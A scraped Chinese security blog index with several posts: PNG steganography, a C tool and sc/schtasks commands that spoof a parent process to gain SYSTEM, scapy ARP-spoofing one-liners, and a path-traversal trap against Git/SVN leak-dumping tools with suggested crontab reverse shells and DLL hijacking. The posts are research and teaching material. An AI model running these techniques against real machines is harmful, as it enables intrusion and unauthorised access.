接着就很自然而然地想利用这种特性来藏数据了。既然透明度为0像素点完全透明，那该像素点的RGB这3个通道的字节数据我们不就可以随便用来存数据了么，而且其他像素点仍可以存储正常的图像数据啊！比如上图的透明背景图，透明像素数据的RGB值为0xffffff是因为该图的背景图层为白色（或空），那么反正它也不显示（透明度100%），干脆就征用一个字节来隐藏数据吧（如B通道字节，也可以RGB全征用）。那么隐藏数据前可以先计算一下图片的可用容量，比如设定A通道为0且R、G两通道为0xff则判断为可用像素点： 当可用透明像素点数量大于要隐藏的数据字节数就可以进行存储了，直接依次存进去每个可用像素点的B通道字节呗，存完后加个结束标志就行： 直接看一下隐藏效果吧，还是以存储计算器程序calc.exe（大约900kb）为例： 还行吧，肉眼仍看不出图片显示有什么不同，图片size看上去也还可以，膨胀不到1MB（差不多计算器程序的size），并且还有不小的提升空间（比如图片处理掉更多像素，或者加入其他2个通道存储）。然后使用神器“Stegsolve.jar”来看看图片隐藏的计算器吧： 当然之所以能这样一开始直接就看到数据是因为选取图片像素的原点区域正好被掏空（透明区域）可以用来存储数据，其实根据载体图片的不同完全可能将字节数据“随机化”。最后关于如何获取具有透明通道格式的可存储图片也很简单，以Photoshop为例，随便拉张图片选取无关背景区域直接删除像素（抠图），也可以再加一层透明图层背景，然后保存为PNG格式即可。 ","date":"2021-11-27","objectID":"/zh-cn/27-3/:0:3","tags":["隐写术"],"title":"PNG隐写术实践","uri":"/zh-cn/27-3/"},{"categories":["隐写术"],"content":"0x4 工具实现 既然研究都差不多了，不实现工具化总归有点不完整，示例代码就不多做介绍了，写的很粗糙原本是不打算献丑的，本着学习分享的理念还是直接扔到Github上仅供参考吧。以下分别是LSB和PNG Alpha通道隐写工具，均包含加解密两种功能，以及处理过程相关的提示，可以满足一般的信息隐藏需求。 Demo地址：https://github.com/weiyiling/img_store 包含上述直接编译好的工具可以测试，目前仅面向PNG的ARGB32格式图片支持良好~ 文章封面图片是一个彩蛋，内含该工具，读者可以尝试提取实践。 ","date":"2021-11-27","objectID":"/zh-cn/27-3/:0:4","tags":["隐写术"],"title":"PNG隐写术实践","uri":"/zh-cn/27-3/"},{"categories":["隐写术"],"content":"0x5 总结 通过这次的探索，对图像有了进一步的理解，图像像素的组织格式多种多样，本质上是颜色信息存储格式的差异，而信息隐藏的原理却是异曲同工，都是在于对目标载体的数据格式做分析，寻求可供存储的“无关”数据空间，只要不影响原始载体的功能“感觉”，应该都是可以操作的。 ","date":"2021-11-27","objectID":"/zh-cn/27-3/:0:5","tags":["隐写术"],"title":"PNG隐写术实践","uri":"/zh-cn/27-3/"},{"categories":["隐写术"],"content":"0x6 参考链接 1、《利用PNG像素隐藏PE代码：分析PNG Dropper新样本》：https://www.anquanke.com/post/id/166451 2、《图像隐写之使用PHP隐藏图像中的文本》：https://zhuanlan.kanxue.com/article-4472.htm 3、《RGB格式详解（三）—RGB像素格式》：http://blog.51cto.com/7335580/2065296 ","date":"2021-11-27","objectID":"/zh-cn/27-3/:0:6","tags":["隐写术"],"title":"PNG隐写术实践","uri":"/zh-cn/27-3/"},{"categories":["工具","权限"],"content":"自己动手实现一个工具将Admin权限提升到System权限 ","date":"2021-11-27","objectID":"/zh-cn/27-2/:0:0","tags":["工具","权限"],"title":"自己动手实现一个工具将Admin权限提升到System权限","uri":"/zh-cn/27-2/"},{"categories":["工具","权限"],"content":"0x00 前言 最近又碰上一种需要提升权限到系统最高权限（System）的情况，于是想搬出以前从网上GET到的一种利用系统服务启动的路子来实现这个需求，然后发现在最新的Win10系统上有点不好使了，所以才有了本文一系列的学习记录。 ","date":"2021-11-27","objectID":"/zh-cn/27-2/:0:1","tags":["工具","权限"],"title":"自己动手实现一个工具将Admin权限提升到System权限","uri":"/zh-cn/27-2/"},{"categories":["工具","权限"],"content":"0x01 概念解释 涉及Windows系统权限的话题其实可以展开很多来讲，本文重点是如何从正常用户拥有的管理员权限（Administrator）提升到拥有更高的SYSTEM用户的权限。 注意，与安全漏洞导致的权限提升不同，这里的权限提升操作是系统允许的“合法”操作，从某种角度看有点类似Linux系统的sudo操作，当然前提是用户需要有管理员的权限。 正常Windows系统中会存在很多的用户，根据其所拥有的权限不同会有所分级（组）。比如正常的个人电脑的默认登录账户一般拥有管理员权限，当然也可能会创建多个权限低一些的普通账户。而权限更低一些的有默认不启用的来宾账户，只能访问和操作比较有限的一些资源，权限更高的则有系统运行级别使用的SYSTEM账户等。 系统上运行的每个应用程序，通常都是绑定一个运行账户的，这通常就是该进程对应所能允许的运行权限了。打开任务管理器，查看进程详细信息（Win7系统在进程标签页，需勾选下方的“显示所有用户的进程”，Win10系统的在详细信息标签页），就可以看到系统中运行的每个进程和相应的权限账户，其中多数进程是系统权限级别运行的系统服务进程： 注意，这里的管理员账户“Administrator”只是一个默认的管理员名称，可以创建其他比如张三或李四的账户，并将其设置为管理员账户，其实就是将普通账户加入到管理员组“Administrators”。 还需要区分的一点是Windows特有的UAC权限提升操作。这是从Win Vista开始引入的一种特殊的权限控制机制，其本质是加一道防御锁给管理员用户，多数情况用不着打开这道锁，只有需要进行管理员权限及以上的操作时才需要多进行一步解锁的操作（通常就是右键“管理员权限运行”）。这个特殊的控制是利用系统启动桌面界面（explorer.exe）时设置了普通账户权限运行，这样即使当前登录的账户是管理员账户，也可能需要在某些时候右键以管理员权限运行（根据UAC设置级别不同情况不一样），才能真正获得管理员权限。想解出这种限制除了降低UAC级别外，还有一种方便的小技巧，就是先以管理员权限运行一个命令行，然后重启桌面进程。当然关于UAC的话题还有很多，这里不做过多的介绍。 ","date":"2021-11-27","objectID":"/zh-cn/27-2/:0:2","tags":["工具","权限"],"title":"自己动手实现一个工具将Admin权限提升到System权限","uri":"/zh-cn/27-2/"},{"categories":["工具","权限"],"content":"0x02 提升方式 根据上述理解，本文的目的应该是要在具有管理员权限的前提下，将用户的操作权限进一步提升到能够运行系统服务的系统（SYSTEM）权限。这里介绍几种从网上整理的权限提升方式。 1、 创建系统服务，借助服务进程（svchost.exe，运行在SYSTEM账户下，具有系统权限）来运行子进程。 比如可以通过以下命令创建并启动一个名称为system_srv的专用服务，来启动一个cmd命令行窗口 sc Create system_srv binPath= \"cmd /K start\" type= own type= interact sc start system_srv 但是这种方式在最新的Win10系统上会直接失败，在Win7上由于启动的是一个cmd命令行窗口交互程序，会弹出如下提示，需要点击交互窗口的“查看消息”后才能得到一个具有系统权限的cmd进程。 点击“查看消息”后进入cmd窗口服务专门的界面，此时已获得SYSTEM权限： 此时再看下进程列表，也显示该进程由SYSTEM账户运行： 此方式使用完毕后可以用如下命令删除该服务： sc delete system_srv 2、 创建计划任务，并指定运行权限为SYSTEM，最终也是由系统服务svchost.exe来启动指定的子进程。 比如可以通过以下命令创建一个名称为system_srv的计划任务，来启动一个记事本程序 schtasks /Create /TN system_srv /SC DAILY /ST 12:45 /TR notepad.exe /RU SYSTEM 虽然这个方式适用最新的Win10系统，但是运行后发现，虽然通过任务管理器能够在进程列表里找到记事本程序确实以SYSTEM用户和权限启动了，但是奇怪的是桌面上并没有弹出记事本的窗口，这里猜测是因为计划任务创建的进程只能在系统后台运行？？ 同样可以通过如下命令在任务运行结束后查看或删除计划任务： schtasks /Query /TN system_srv schtasks /Delete /TN system_srv /F 3、 使用第三方工具，如用incognito或TokenManipulation复制token，或者用PowellShell的安装模块“NtObjectManager”指定新建进程的父进程。 这里介绍下NtObjectManager，该模块是可以通过PowerShell命令直接从PowerShell仓库（类似Python仓库）进行安装的项目工具，项目地址如下： https://www.powershellgallery.com/packages/NtObjectManager/1.1.1 Win10系统通过以下PoweShell指令可以直接安装该工具： Install-Module -Name NtObjectManager -RequiredVersion 1.1.1 然后就可以使用该工具的指令集来创建一个指定父进程的子进程，新建的子进程将继承父进程的运行账户和权限： $p = Get-NtProcess -Name TrustedInstaller.exe $proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p 如指定父进程为“TrustedInstaller.exe”创建一个cmd命令行窗口，直接获取系统最高的权限（SYSTEM用户+NT SERVICE TrustedInstaller组） ","date":"2021-11-27","objectID":"/zh-cn/27-2/:0:3","tags":["工具","权限"],"title":"自己动手实现一个工具将Admin权限提升到System权限","uri":"/zh-cn/27-2/"},{"categories":["工具","权限"],"content":"0x03 动手实现 之所以会想自己动手实现一个工具，是因为觉得使用powershell环境还是不太方便，win7系统无法直接使用Install-Module指令来安装NtObjectManager工具，于是萌生研究其实现原理并动手Copy上述功能的想法。 首先定位研究目标的代码，既然是脚本工具，肯定也是安装在本地的某个目录，果不其然： 查看NtObjectManager.psd1文件可以找到相关指令和函数“Get-NtProcess”和“New-Win32Process”的声明： 然后从NtObjectManager.psm1文件的定义中可以看出，具体实现应该是依赖NtApiDotNet.dll中的NtProcess程序集： 使用dnspy反编译NtApiDotNet.dll，定位NtProcess程序集，找到其中一个关键的方法“GetProcesses”，发现该方法可以用来获取系统上运行过的进程： 该方法实际上都是调用的同一个ntdll的API函数“NtGetNextProcess”： 该函数声明如下，通过该API函数可以直接遍历系统上运行过的进程，包括已经终结退出的进程，拿到指定进程的进程句柄，进而获取到该进程的信息如进程ID，token令牌等。 拿到指定进程的句柄之后，就可以通过设置进程属性中的父进程句柄，来实现指定父进程继承该进程的运行权限。借用下网上的代码，稍作修改，就简单实现了上述功能的工具，可以指定系统任意运行过的进程名来运行任意程序，运行后将继承前者的权限。 typedef NTSTATUS (NTAPI* FPNtGetNextProcess)( _In_ HANDLE ProcessHandle, _In_ DWORD DesiredAccess, _In_ DWORD HandleAttributes, _In_ int Flags, _Out_ HANDLE* NewProcessHandle ); HANDLE get_process_handle(char *processName) { HANDLE hGet = NULL; HANDLE hResult = NULL; HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\"); FPNtGetNextProcess fpNtGetNextProcess = (FPNtGetNextProcess)GetProcAddress(hNtdll, \"NtGetNextProcess\"); while(fpNtGetNextProcess(hGet, MAXIMUM_ALLOWED, NULL, 0, \u0026hGet) == STATUS_SUCCESS) { char buf[MAX_PATH] = {0}; ULONG size = 0; GetProcessImageFileNameA(hGet, buf, MAX_PATH); if (strstr(buf, processName) != NULL) { hResult = hGet; } } return hResult; } int main(int argc, char* argv[]) { EnablePrivilege(SE_DEBUG_NAME); //必须是debug权限 char* processName = argv[1]; char* cmdline = argv[2]; HANDLE hParent = get_process_handle(processName, bPrintInfo); PROCESS_INFORMATION pi = {0}; STARTUPINFOEXA si = {sizeof(STARTUPINFOEXA)}; SIZE_T cbAListSize = 0; InitializeProcThreadAttributeList(NULL, 1, 0, \u0026cbAListSize); PPROC_THREAD_ATTRIBUTE_LIST pAList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAListSize); InitializeProcThreadAttributeList(pAList, 1, 0, \u0026cbAListSize); UpdateProcThreadAttribute(pAList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, \u0026hParent, sizeof(HANDLE), NULL, NULL); si.lpAttributeList = pAList; CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_NEW_CONSOLE, NULL, NULL, \u0026si.StartupInfo, \u0026pi); DeleteProcThreadAttributeList(pAList); HeapFree(GetProcessHeap(),0,pAList); return 0; } 如下即为实现效果，以winlogon.exe（系统登录进程）的运行权限启动一个命令行窗口。 另外，研究过程中发现一个小彩蛋：使用该工具复制进程权限时，即使所指定的进程已经退出，仍然可以成功将新启动的进程指定为该进程的子进程并完全继承其权限，真是所谓的“借尸还魂”！对其感兴趣的可以自动动手实验下。 ","date":"2021-11-27","objectID":"/zh-cn/27-2/:0:4","tags":["工具","权限"],"title":"自己动手实现一个工具将Admin权限提升到System权限","uri":"/zh-cn/27-2/"},{"categories":["工具","权限"],"content":"0x04 总结 本文通过笔者对于Windows权限控制认识的角度出发对相关知识内容进行整理和学习，希望能够抛砖引玉，不仅帮助到有相同需求的朋友，也能够引起思考和启发，分享更多的研究知识和成果。 ","date":"2021-11-27","objectID":"/zh-cn/27-2/:0:5","tags":["工具","权限"],"title":"自己动手实现一个工具将Admin权限提升到System权限","uri":"/zh-cn/27-2/"},{"categories":["工具","权限"],"content":"0x05 参考链接 1、 https://cloud.tencent.com/developer/article/1014745 2、 https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Token窃取与利用/ 3、 https://blog.csdn.net/whitehack/article/details/6078983 ","date":"2021-11-27","objectID":"/zh-cn/27-2/:0:6","tags":["工具","权限"],"title":"自己动手实现一个工具将Admin权限提升到System权限","uri":"/zh-cn/27-2/"},{"categories":["工具","权限"],"content":"附件: copy_privilege.zip (2.1 MB) ","date":"2021-11-27","objectID":"/zh-cn/27-2/:0:7","tags":["工具","权限"],"title":"自己动手实现一个工具将Admin权限提升到System权限","uri":"/zh-cn/27-2/"},{"categories":["360ARP防火墙","智能追踪","原理探究"],"content":"360ARP防火墙“智能追踪”原理探究 ","date":"2021-11-27","objectID":"/zh-cn/27-1/:0:0","tags":["360ARP防火墙","智能追踪","原理探究"],"title":"360ARP防火墙“智能追踪”原理探究","uri":"/zh-cn/27-1/"},{"categories":["360ARP防火墙","智能追踪","原理探究"],"content":"0x00关于本文 ","date":"2021-11-27","objectID":"/zh-cn/27-1/:0:1","tags":["360ARP防火墙","智能追踪","原理探究"],"title":"360ARP防火墙“智能追踪”原理探究","uri":"/zh-cn/27-1/"},{"categories":["360ARP防火墙","智能追踪","原理探究"],"content":" 很早就知道360有个ARP防火墙，中学的微机课上还装个攻击程序来让老师电脑上的360报警，现在课上做ARP实验装了个靶机，忽然就想拿下来调戏一番，结果一调戏就发现一些问题了。 ","date":"2021-11-27","objectID":"/zh-cn/27-1/:0:2","tags":["360ARP防火墙","智能追踪","原理探究"],"title":"360ARP防火墙“智能追踪”原理探究","uri":"/zh-cn/27-1/"},{"categories":["360ARP防火墙","智能追踪","原理探究"],"content":"0x01360 ARP防火墙的功能 这个ARP防护功能在360的流量防火墙中的局域网防护中 一旦捕获到了攻击还能“智能追踪” MAC地址懒得打码了 ","date":"2021-11-27","objectID":"/zh-cn/27-1/:0:3","tags":["360ARP防火墙","智能追踪","原理探究"],"title":"360ARP防火墙“智能追踪”原理探究","uri":"/zh-cn/27-1/"},{"categories":["360ARP防火墙","智能追踪","原理探究"],"content":"0x01360 智能追踪功能实现原理 最开始，我的猜想是，这个追踪功能靠的是ARP包里面所声称的地址来实现的，因为欺骗者总是想要自己声称自己的MAC地址对应网关的地址，以此来欺骗受害者。 但是测了一下发现并不是这样。 用scapy命令send(ARP(op=1,hwsrc=‘11:45:14:19:19:81’,hwdst=‘00:0C:29:AC:46:B5’,psrc=‘192.168.1.1’,pdst=‘192.168.1.235’)) 构造一个非攻击者的地址发过去，但还是被360找到了真实的地址 这是怎么回事呢？那只能抓包看看了。 一看wireshark就找到问题了，原来以太帧里面就会有这个MAC地址 那么要是把以太帧上的源地址换掉会怎么样呢？ 通过scapy可以轻易伪造源地址 sendp(Ether(src=‘11:45:14:19:38:6F’)/ARP(op=1,hwsrc=‘11:45:14:19:19:81’,hwdst=‘00:0C:29:AC:46:B5’,psrc=‘192.168.1.1’,pdst=‘192.168.1.235’)) 结果360就只能看到错误的地址了 而360的“追踪”是怎么回事呢，抓包发现360是执行了一次局域网内的ARP扫描，尝试找到攻击者的MAC地址对应的IP地址 通过这个简单的测试，我们已经知道了360ARP防火墙智能追踪功能的实现原理： 收到异常ARP包的时候，从以太帧中提取攻击者的真实MAC地址，然后执行ARP扫描，找到这个MAC地址对应的IP，从而实现追踪 ","date":"2021-11-27","objectID":"/zh-cn/27-1/:0:4","tags":["360ARP防火墙","智能追踪","原理探究"],"title":"360ARP防火墙“智能追踪”原理探究","uri":"/zh-cn/27-1/"},{"categories":["360ARP防火墙","智能追踪","原理探究"],"content":"0x02 点评 360 ARP防火墙只能根据以太帧中的MAC地址来做“追踪”，因此攻击者可以随时改掉包中的地址来借刀别的机器或者让360追踪不出来，当然这并不是360技术有缺陷，而是因为作为一台装在用户主机上的软件，它只能做到这样。 事实上，大部分的ARP欺骗工具都不会修改以太帧中的MAC地址，因此大部分情况已经够用了 ","date":"2021-11-27","objectID":"/zh-cn/27-1/:0:5","tags":["360ARP防火墙","智能追踪","原理探究"],"title":"360ARP防火墙“智能追踪”原理探究","uri":"/zh-cn/27-1/"},{"categories":["源码"],"content":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷） ","date":"2021-11-27","objectID":"/zh-cn/27/:0:0","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x00 关于本文 是的没错我又去蹂躏安全工具了，和以前我单个单个地欺负不同，这次发现的攻击手段是通用的，可以通杀大部分源码泄露漏洞利用程序。 本文会包含常见泄露漏洞的原理介绍（Git/Svn），利用工具自身的安全风险分析，简单易懂的POC制作方式，针对常见工具的攻击测试，以及提升反制威力的方法及展望。 ","date":"2021-11-27","objectID":"/zh-cn/27/:0:1","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x01Git泄露：漏洞原理介绍 Git是什么大家应该都很清楚（不知道Git是啥的人多半是不肯来光临这个博客的） 有些开发人员直接把代码clone到服务器的web目录来部署，但是开发人员或许不知道的是，clone下来的不只是代码，还有一个.git目录，这个目录被叫做版本库。攻击者可以通过访问这个目录，解析其中的文件，dump整站源码。 想要更深入地理解Git泄露漏洞，了解攻击流程，就需要了解.git目录的结构 tree一下这个目录，发现内容如下 index文件中包含了这个项目中的各个文件的信息，包括文件路径和Git对象的对应的40位哈希值。在这里我们不需要对Git对象理解的很深入，只需要知道里面包含了文件内容，是让攻击者垂涎欲滴的东西就可以了。 想要拿到Git对象，就需要转去objects目录。objects目录存放了所有的git对象，对于一个git对象，40位哈希的前两位会作为目录名，而后面的38位会作为文件名，存在objects下面。举个例子，一个Git对象那个的hash是cb75d8439f004f41d5f85ffa5f8d017df395651a，那么它就会被存在cb/75d8439f004f41d5f85ffa5f8d017df395651a。 知道了这些信息之后，就可以知道Git泄露攻击是如何进行的了，首先攻击者访问index文件，解析后得到文件名和对象哈希。接着按着对象哈希一个一个去objects目录获取到Git对象，解析后得到文件。 ","date":"2021-11-27","objectID":"/zh-cn/27/:0:2","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x02 Git泄露利用工具的安全风险 显而易见的，手动解析index文件并去下载然后再去解析Git对象是一项烦人又重复的活，因此有大量的工具被开发出来解放黑客们的双手。这些工具可以将整个攻击流程自动化，自动下载项目的所有文件，并且重建整个项目的目录结构。 但是在这个过程中存在一个严重的安全风险，这些工具在重建项目的目录结构的时候，往往没有考虑到路径穿越风险，而是直接将目录连接起来，因此通过创建恶意的git目录可以在攻击者的磁盘中写入任意文件，实现远程代码执行！ ","date":"2021-11-27","objectID":"/zh-cn/27/:0:3","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x03 简单易懂的POC制作方式 直接用git工具制作POC是不可行的，它会提示文件在仓库之外 好在有个叫做GitPython的库不关心这个问题，因此可以用GitPython来生成POC。 首先在仓库外的某个目录放一个文件，该文件会写入到攻击者的电脑上的相同路径。 接着打开python，用GitPython将其加入项目中然后commit，注意，要用../../../(很多个../)加上文件的绝对路径的方式来加入。 在下图生成的POC中，POC只是为了证明可以写到非预期目录，只加了一个../ 在执行完了后，整个git项目的文件夹就成了蜜罐 ","date":"2021-11-27","objectID":"/zh-cn/27/:0:4","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x04 对常见工具的测试 为了试验该手段的通用性，使用常见工具对蜜罐进行测试，以文件是否成功写入到非预定目录为判断标准。 一个成功的例子如图，dumpall工具将tohacker.txt写到了预期目录192.168.208.190_None之外。 测试结果如下表所示 工具名称 工具地址 攻击是否成功 GitHack https://github.com/lijiejie/GitHack 是 GitHack https://github.com/BugScanTeam/GitHack 是 dumpall https://github.com/0xHJK/dumpall 是 GitHacker https://github.com/WangYihang/GitHacker 是 dvcs-ripper https://github.com/kost/dvcs-ripper 否 git-dumper https://github.com/arthaud/git-dumper 是 在测试的工具中，除了dvcs-ripper外全部攻击成功（dvcs-ripper失败原因还没分析），证明了该反制手段的通用性 ","date":"2021-11-27","objectID":"/zh-cn/27/:0:5","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x05 Svn泄露原理 Svn和Git类似，也是一种版本管理工具。 有些开发人员在部署的时候偷懒，没有通过”export“的方式将代码导出，而是直接拷贝目录，导致下面的.svn文件夹也被拷贝了。（嗯，和Git泄露如出一辙啊） 和Git不同，Svn的泄露有两种可能的情况。 当Svn版本小于1.6的情况下（也有说1.7的，没试），.svn文件夹中的entries会以明文存储目录和文件信息。其中包含了文件名，这个时候访问/.svn/text-base/文件名-.svn-base就可以拿到文件。 当Svn版本更高的情况下，.svn文件夹中的entries不会包含目录和文件信息，攻击者首先需要访问/.svn/wc.db文件，这个文件是个sqlite3数据库，其中的Node表中包含了文件的信息，包括文件名和哈希等。在获取到这些信息后，访问/.svn/pristine/哈希的前两位/哈希.svn-base即可访问到文件。举个例子，有一个文件对应的哈希是 a94a8fe5ccb19ba61c4c0873d391e982fbbd3， 那其路径为/.svn/pristine/a9/a94a8fe5ccb19ba61c4c0873d391e987982fbbd3.svn-base。 ","date":"2021-11-27","objectID":"/zh-cn/27/:0:6","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x06 简单易懂的POC制作方式 针对低版本的Svn，我抄袭了这里的格式，使得POC如下图所示。首先entries的开头为\"10\"，表示自己是个低版本的Svn的文件，接着按照之前写Git的POC的方式写个恶意的文件路径，然后空行写个\"file\"，以此表明上面写的路径是个文件，最后把文件放在对应的Web目录以便于扫描器去下载。 高版本的Svn有些复杂，于是我找了个网站来生成Svn项目，并用TortoiseSVN添加文件再checkout到目录中，这个时候就可以看到.svn目录了。接着再用SQLite编辑工具编辑目录中的wc.db中的Node表，更改文件目录为恶意路径。最后再如法炮制放置文件即可 ","date":"2021-11-27","objectID":"/zh-cn/27/:0:7","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x07 对常见工具的测试 测试的方式和标准与测试Git泄露利用工具的标准一致，但是优先测试低版本的泄露，如果低版本的泄露无效再测试高版本的（人都是懒惰的），测试结果如下表所示 工具名称 工具地址 攻击是否成功 svnExploit https://github.com/admintony/svnExploit 是 SvnHack https://github.com/callmefeifei/SvnHack/ 是（必须放在根目录） Seay-Svn https://github.com/Introspelliam/tools/ 是 dumpall https://github.com/0xHJK/dumpall 是（只支持高版本） svn-extractor https://github.com/anantshri/svn-extractor 是 （只支持高版本） dvcs-ripper https://github.com/kost/dvcs-ripper 否（跑不起来且不想跑,perl写的东西没一个用着省心的） 在测试的工具中，除了dvcs-ripper外全部攻击成功（这玩意跑都跑不起来），证明了该反制手段的通用性 ","date":"2021-11-27","objectID":"/zh-cn/27/:0:8","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x08如何提升杀伤力的 如果只是在非预期的目录写一个文件的话并不能达成反制效果，因此有如下几种方法可以参考使用（未经测试仅供参考）： 对于类unix系统可以写入crontab，增加定时任务，反弹shell回来 对于Windows系统可以写入开始菜单启动项，或者dll劫持 可以把攻击工具的脚本给替换掉，下次执行就能上线 除此之外，可以通过发来的包的TTL值判断操作系统(Windows默认是128，Linux是64或者255)，实现更精准的反制 ","date":"2021-11-27","objectID":"/zh-cn/27/:0:9","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源码"],"content":"0x09展望 很显然，这种手法不只适用于Git/Svn泄露的利用程序，什么DS_STORE，Java任意文件下载利用，估计都跑不了。 ","date":"2021-11-27","objectID":"/zh-cn/27/:0:10","tags":["源码"],"title":"别想偷我源码：通用的针对源码泄露利用程序的反制（常见工具集体沦陷）","uri":"/zh-cn/27/"},{"categories":["源代码"],"content":"一个阅读源代码的技巧 昨天和朋友聊到阅读开源代码，我分享了自己一个读代码的技巧，就是从第一个 commit 开始读。 从第一个 commit 读源码的好处是： 学习别人从零开始建立项目的步骤 一个项目经过漫长的演进后，有很多代码是为了解决特殊场景（或者 bug）而写的，这些代码对于理解核心逻辑来说，是一种干扰。 ","date":"2021-11-26","objectID":"/zh-cn/26-2/:0:0","tags":["源代码"],"title":"一个阅读源代码的技巧","uri":"/zh-cn/26-2/"},{"categories":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"content":"命題邏輯 Logical Equivalences 邏輯等價, Rules of Inference 推理規則 ","date":"2021-11-26","objectID":"/zh-cn/26-1/:0:0","tags":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"title":"命題邏輯 Logical Equivalences 邏輯等價, Rules of Inference 推理規則","uri":"/zh-cn/26-1/"},{"categories":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"content":"Logical Equivalences Equivalence Name p ∧ ⊤ ≡ p p ∨ ⊥ ≡ p Identity laws p ∨ ⊤ ≡ ⊤   p ∧ ⊥ ≡ ⊥ Domination laws p ∨ p ≡ p   p ∧ p ≡ p Idempotent or tautology laws ¬ ( ¬ p ) ≡ p Double negation law p ∨ q ≡ q ∨ p   p ∧ q ≡ q ∧ p Commutative laws ( p ∨ q ) ∨ r ≡ p ∨ ( q ∨ r )   ( p ∧ q ) ∧ r ≡ p ∧ ( q ∧ r ) Associative laws p ∨ ( q ∧ r ) ≡ ( p ∨ q ) ∧ ( p ∨ r )   p ∧ ( q ∨ r ) ≡ ( p ∧ q ) ∨ ( p ∧ r ) Distributive laws ¬ ( p ∧ q ) ≡ ¬ p ∨ ¬ q   ¬ ( p ∨ q ) ≡ ¬ p ∧ ¬ q De Morgan's laws p ∨ ( p ∧ q ) ≡ p   p ∧ ( p ∨ q ) ≡ p Absorption laws p ∨ ¬ p ≡ ⊤   p ∧ ¬ p ≡ ⊥ Negation laws ","date":"2021-11-26","objectID":"/zh-cn/26-1/:1:0","tags":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"title":"命題邏輯 Logical Equivalences 邏輯等價, Rules of Inference 推理規則","uri":"/zh-cn/26-1/"},{"categories":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"content":"Logical Equivalences Involving Conditional Statements p → q ≡ ¬ p ∨ q   p → q ≡ ¬ q → ¬ p   p ∨ q ≡ ¬ p → q   p ∧ q ≡ ¬ ( p → ¬ q )   ¬ ( p → q ) ≡ p ∧ ¬ q   ( p → q ) ∧ ( p → r ) ≡ p → ( q ∧ r )   ( p → q ) ∨ ( p → r ) ≡ p → ( q ∨ r )   ( p → r ) ∧ ( q → r ) ≡ ( p ∨ q ) → r   ( p → r ) ∨ ( q → r ) ≡ ( p ∧ q ) → r ","date":"2021-11-26","objectID":"/zh-cn/26-1/:1:1","tags":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"title":"命題邏輯 Logical Equivalences 邏輯等價, Rules of Inference 推理規則","uri":"/zh-cn/26-1/"},{"categories":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"content":"Logical Equivalences Involving Biconditional Statements p ↔ q ≡ ( p → q ) ∧ ( q → p )   p ↔ q ≡ ¬ p ↔ ¬ q   p ↔ q ≡ ( p ∧ q ) ∨ ( ¬ p ∧ ¬ q )   ¬ ( p ↔ q ) ≡ p ↔ ¬ q ","date":"2021-11-26","objectID":"/zh-cn/26-1/:1:2","tags":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"title":"命題邏輯 Logical Equivalences 邏輯等價, Rules of Inference 推理規則","uri":"/zh-cn/26-1/"},{"categories":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"content":"Rules of Inference R u l e   o f   I n f e r e n c e N a m e p p → q ― ∴ q Modus ponens ¬ q p → q ― ∴ ¬ p Modus tollens p → q q → r ― ∴ p → r Hypothetical syllogism p ∨ q ¬ p ∴ q ― Disjunctive syllogism p ∴ p ∨ q ― Addition p ∧ q ― ∴ p Simplification p q ∴ p ∧ q ― Conjunction p ∨ q ¬ p ∨ r ∴ q ∨ r ― Resolution ","date":"2021-11-26","objectID":"/zh-cn/26-1/:2:0","tags":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"title":"命題邏輯 Logical Equivalences 邏輯等價, Rules of Inference 推理規則","uri":"/zh-cn/26-1/"},{"categories":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"content":"Rules of Inference for Quantified Statements R u l e   o f   I n f e r e n c e N a m e ∀ x P ( x ) ∴ P ( c ) Universal instantiation P ( c )   f o r   a n   a r b i t r a r y   c ∴ ∀ x P ( x ) Universal generalization ∃ x P ( x )   ∴ P ( x )   f o r   s o m e   e l e m e n t   c Existential instantiation P ( x )   f o r   s o m e   e l e m e n t   